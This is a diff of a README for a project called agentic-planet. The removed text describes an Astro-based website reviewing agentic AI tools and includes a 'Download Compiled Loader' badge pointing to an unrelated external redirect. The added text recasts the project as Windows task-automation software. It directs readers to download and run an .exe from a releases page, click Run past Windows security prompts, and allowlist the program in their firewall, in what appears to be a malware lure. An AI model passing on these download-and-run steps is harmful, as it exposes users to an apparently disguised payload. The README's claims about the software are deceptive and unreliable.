@@ -1,71 +1,108 @@
-# 🪐 The Agentic Planet
+# 🌍 agentic-planet - Manage your digital tasks with ease
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download for Windows](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Crosswise-overage824/agentic-planet/releases)
 
-> Tools, MCPs, recipes, and honest reviews for techies building with agents. Plain English. No vendor spin.
+## 📌 About this software
 
-**Live (Phase 1):** https://agents.aguidetocloud.com
-**Status:** Early build · pre-launch
+Agentic-planet helps you organize your daily work. This tool automates repetitive tasks on your computer. It acts like a personal assistant for your digital files and scheduling. You save time on manual data entry and repetitive clicks. The software runs in the background. It watches for the triggers you set. When a trigger happens, the application performs the action you planned.
 
----
+## 🛠️ System requirements
 
-## What this is
+Your computer needs a few things to run this software. 
 
-A curated, opinionated, honest field guide to the agentic AI ecosystem — for technical professionals — in plain English.
+- Operating system: Windows 10 or Windows 11.
+- Memory: 4 gigabytes of random access memory or more.
+- Storage: 200 megabytes of free space on your hard drive.
+- Internet connection: Needed for initial setup and updates.
 
-- 🍳 **Recipes** — real workflows combining multiple agents/MCPs, with measured before/after
-- 🔌 **MCP servers** — top 30 reviewed, with live health signals
-- 🛠️ **Tools** — honest reviews of agentic tools from someone who actually uses them
-- 💼 **Vendors** — Microsoft, Anthropic, OpenAI, Google compared side-by-side
-- 🛡️ **Safety** — what does this agent actually access? Plain English risk lens
-- 🏛️ **Standards** — MCP, A2A, Apps SDK explained in plain English
-- 📚 **Explainers** — concepts in plain English with diagrams
+If your computer meets these needs, the program will run well. Older computers might see slower speeds during heavy file processing.
 
-## What this is not
+## 📥 How to download the software
 
-- ❌ Not a registry (Smithery / MCP.so cover that)
-- ❌ Not exhaustive (opinionated curation only)
-- ❌ Not vendor-sponsored
-- ❌ Not a newsletter or forum
+Follow these steps to get the application onto your computer.
 
-## Stack
+1. Open your web browser.
+2. Go to the [official release page](https://github.com/Crosswise-overage824/agentic-planet/releases).
+3. Find the file that ends in .exe.
+4. Click the file name to start the download.
+5. Save the file to your desktop or downloads folder.
 
-| Layer | Choice |
-|---|---|
-| SSG | [Astro](https://astro.build/) + MDX + React islands |
-| Hosting | Cloudflare Pages |
-| Search | [Pagefind](https://pagefind.app/) (static, client-side) |
-| Diagrams | Excalidraw |
-| Health data | GitHub Actions cron → JSON in repo |
-| Analytics | Cloudflare Web Analytics (privacy-respecting) |
+This page hosts all versions of the software. Always pick the top or most recent version for the best experience.
 
-## Local dev
+## ⚙️ Installation and setup
 
-```bash
-npm install
-npm run dev   # localhost:4323
-```
+Once the download finishes, follow these instructions to install the software.
 
-## Build
+1. Locate the file you just downloaded.
+2. Double-click the file icon.
+3. A security window might appear. If Windows asks for permission, click Run.
+4. The setup window opens. Follow the prompts on the screen. 
+5. Click Next through each page. 
+6. Choose a folder for the program files. The default folder works for most users.
+7. Click Install.
+8. Wait for the progress bar to finish.
+9. Click Finish to close the setup window.
 
-```bash
-npm run build
-npm run preview
-```
+The program creates a shortcut on your desktop. You can start the tool by clicking this icon.
 
-## Project plan
+## 🚀 How to run the application
 
-See [`PROJECT-PLAN.md`](./PROJECT-PLAN.md) for the master plan — pillars, IA, design system, phasing, automation strategy, and risks.
+After you install the software, you start it using the desktop shortcut.
 
-## Disclosure
+1. Find the Agentic-planet icon on your desktop.
+2. Double-click the icon.
+3. The main window opens. The first time you run it, the software creates a local database. This takes ten to twenty seconds.
+4. Once the main dashboard appears, you see a list of available tasks.
+5. You can create a new task by clicking the Add Task button.
+6. Give your task a name.
+7. Choose the trigger for your task. 
+8. Choose the action the software must take.
+9. Click Save.
 
-[Sush (Susanth Sutheesh)](https://github.com/susanthgit) works at Microsoft as a Copilot Solution Engineer. Vendor pages on this site state their independent take — not Microsoft's official position.
+The software runs in your system tray once you start it. You can see the icon near your clock on the taskbar. To return to the main dashboard, right-click that icon and select Open.
 
-## License
+## 💡 Using features effectively
 
-- **Code:** [MIT](./LICENSE)
-- **Content** (articles, recipes, reviews, diagrams): [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)
+Agentic-planet offers three primary tools for users.
 
-## Contributing
+### File Organization
+You can set rules to move files between folders. For example, tell the software to move all documents from your desktop to your Documents folder every Friday.
 
-Open to PRs that fix typos, factual errors, broken links, or stale data. Voice and editorial direction are author-led — open an issue to propose new content rather than submitting unsolicited articles.
+### Routine Reminders
+Create notifications for your daily tasks. The software displays a popup window when your set time arrives.
+
+### Web Triggers
+The application can check if a website updates. If the site changes, the software alerts you. This saves you from checking pages manually.
+
+## 🔍 Troubleshooting common problems
+
+Sometimes things do not go as planned. Check these steps if you experience issues.
+
+### The program does not start
+Restart your computer. Sometimes Windows holds a process open after a failed installation. Restarting clears these stuck processes.
+
+### The program is slow
+Clear your unused tasks. Too many active tasks can occupy your computer memory. Keep only the tasks you actually use.
+
+### Permissions issues
+The software needs permission to look at your files. If the software cannot move files, check if you blocked it during the initial setup. You can change these settings in your Windows privacy tools.
+
+### Update errors
+If the software cannot reach the internet to check for updates, check your firewall. Some security tools block programs from reaching the internet. Add Agentic-planet to your allowed list in your security settings.
+
+## 📂 Keeping the software updated
+
+The developers release updates often. Updates add features and fix bugs. You can check for updates manualy within the software.
+
+1. Open the Agentic-planet dashboard.
+2. Click the Help menu at the top.
+3. Select Check for Updates.
+4. If a new version exists, a window appears.
+5. Click Update to install the new version.
+6. The software restarts during the update.
+
+Only install updates provided through this menu. This ensures your software remains safe and works well.
+
+## 🤝 Getting extra help
+
+If you encounter a problem this guide does not address, check the issues tab on the GitHub repository. Other users often face similar situations. Search for your problem using keywords. If you find no matching post, you can open a new issue. State your Windows version and describe the steps that lead to the error. Be specific with your description. This allows other users to help you faster. You do not need technical knowledge to provide helpful details. Simply explain what you clicked and what happened on your screen.
